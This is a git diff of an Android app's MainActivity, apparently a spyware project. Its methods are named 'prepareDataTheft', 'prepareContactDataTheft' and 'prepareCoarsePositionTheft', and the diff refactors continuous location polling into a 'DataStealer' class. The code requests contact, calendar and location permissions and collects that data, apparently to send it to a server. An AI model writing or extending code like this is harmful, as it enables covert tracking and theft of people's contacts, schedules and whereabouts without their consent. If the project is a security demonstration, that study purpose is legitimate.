@@ -5,13 +5,8 @@ import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.location.Location;
 import android.os.Bundle;
-import android.os.Looper;
-import android.widget.Toast;
 
 import com.google.android.gms.location.FusedLocationProviderClient;
-import com.google.android.gms.location.LocationCallback;
-import com.google.android.gms.location.LocationRequest;
-import com.google.android.gms.location.LocationResult;
 import com.google.android.gms.location.LocationServices;
 
 import java.util.ArrayList;
@@ -40,8 +35,6 @@ public class MainActivity extends AppCompatActivity {
     private static final int PERMISSION_REQUEST_IDENTIFIER_READ_CALENDAR = 102;
     private static final int PERMISSION_REQUEST_IDENTIFIER_READ_LOCATION = 103;
 
-    private LocationCallback locationCallback;
-    private FusedLocationProviderClient fusedLocationClient;
 
     private APIBuilder.API server;
 
@@ -66,8 +59,8 @@ public class MainActivity extends AppCompatActivity {
      * Mostly taken from https://developer.android.com/training/permissions/requesting#java
      */
     public void prepareDataTheft() {
-        prepareContactDataTheft();
-        prepareCalendarDataTheft();
+        // prepareContactDataTheft();
+        // prepareCalendarDataTheft();
         prepareCoarsePositionTheft();
     }
 
@@ -75,8 +68,6 @@ public class MainActivity extends AppCompatActivity {
         if (ContextCompat.checkSelfPermission(this,
                 Manifest.permission.ACCESS_COARSE_LOCATION)
                 != PackageManager.PERMISSION_GRANTED) {
-
-
             ActivityCompat.requestPermissions(this,
                     new String[]{Manifest.permission.ACCESS_COARSE_LOCATION},
                     PERMISSION_REQUEST_IDENTIFIER_READ_LOCATION);
@@ -92,8 +83,6 @@ public class MainActivity extends AppCompatActivity {
         if (ContextCompat.checkSelfPermission(this,
                 Manifest.permission.READ_CONTACTS)
                 != PackageManager.PERMISSION_GRANTED) {
-
-
             ActivityCompat.requestPermissions(this,
                     new String[]{Manifest.permission.READ_CONTACTS},
                     PERMISSION_REQUEST_IDENTIFIER_READ_CONTACTS);
@@ -138,11 +127,13 @@ public class MainActivity extends AppCompatActivity {
                     // permission was granted
                     displayAndSendCalendarDataInLog();
                 }
+                return;
             }
             case PERMISSION_REQUEST_IDENTIFIER_READ_LOCATION: {
                 if (grantResults.length > 0
                         && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                     // permission was granted
+                    System.out.println("=========== onRequestPermissionsResult called, good.");
                     getContinuousLocationUpdates();
                 }
             }
@@ -185,95 +176,11 @@ public class MainActivity extends AppCompatActivity {
     }
 
 
-    /**
-     * To get continuous location updates while app is in the foreground.
-     * Can be rewritten to get location exactly once.
-     * <p>
-     * Android documentation heavily discourages trying to get location data while in the background.
-     */
     private void getContinuousLocationUpdates() {
-        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
+        FusedLocationProviderClient client = LocationServices.getFusedLocationProviderClient(this);
+        DataStealer locationStealer = new DataStealer(client);
+        locationStealer.getContinuousLocationUpdates(getApplicationContext());
 
-        LocationRequest locationRequest = LocationRequest.create();
-        locationRequest.setInterval(100);
-        locationRequest.setFastestInterval(50);
-        locationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
-
-        locationCallback = new LocationCallback() {
-
-            @Override
-            public void onLocationResult(LocationResult locationResult) {
-                if (locationResult == null) {
-                    return;
-                }
-                for (Location location : locationResult.getLocations()) {
-                    buildLocationToast(location);
-                }
-            }
-        };
-
-        fusedLocationClient.requestLocationUpdates(locationRequest,
-                locationCallback,
-                Looper.getMainLooper());
-
-        Thread stopLocationUpdates = new Thread() {
-
-            @Override
-            public void run() {
-                try {
-                    TimeUnit.SECONDS.sleep(30);
-                } catch (InterruptedException e) {
-                    // This is mostly debug, so don't care at all.
-                } finally {
-                    fusedLocationClient.removeLocationUpdates(locationCallback);
-                    System.out.println("=====STEALER: ENDING REPORTING OF LOCATION");
-                }
-
-            }
-        };
-        stopLocationUpdates.start();
-
-    }
-
-    private void getLastCoarseLocation() {
-        // "Coarse" is roughly a cityblock..
-        // Only works if location has been requested before by something else, which might not be
-        // the case.
-
-        FusedLocationProviderClient fusedLocationClient =
-                LocationServices.getFusedLocationProviderClient(this);
-
-        fusedLocationClient.getLastLocation()
-                .addOnSuccessListener(this, this::buildLocationToast);
-
-    }
-
-    private void buildLocationToast(Location location) {
-        if (location != null) {
-
-            // location.getSpeed();
-            // location.getExtras(); // Number of satellites for the fix
-            double lat = location.getLatitude();
-            double lon = location.getLongitude();
-            long time = location.getTime(); // UTC stamp in milliseconds
-
-            StringBuilder s = new StringBuilder();
-            s.append("Position: ")
-                    .append("long: ")
-                    .append(lon)
-                    .append(" | lat: ")
-                    .append(lat)
-                    .append(" | TIME: ")
-                    .append(time);
-            int duration = Toast.LENGTH_SHORT;
-
-            Toast toast = Toast.makeText(getApplicationContext(), s.toString(), duration);
-            toast.show();
-        } else {
-            Toast toast = Toast.makeText(getApplicationContext(), "Location disabled or not yet received", Toast.LENGTH_LONG);
-            toast.show();
-            // User has disabled "location" in device settings
-        }
     }
 
     private void sendLocationData(List<Location> locations) {
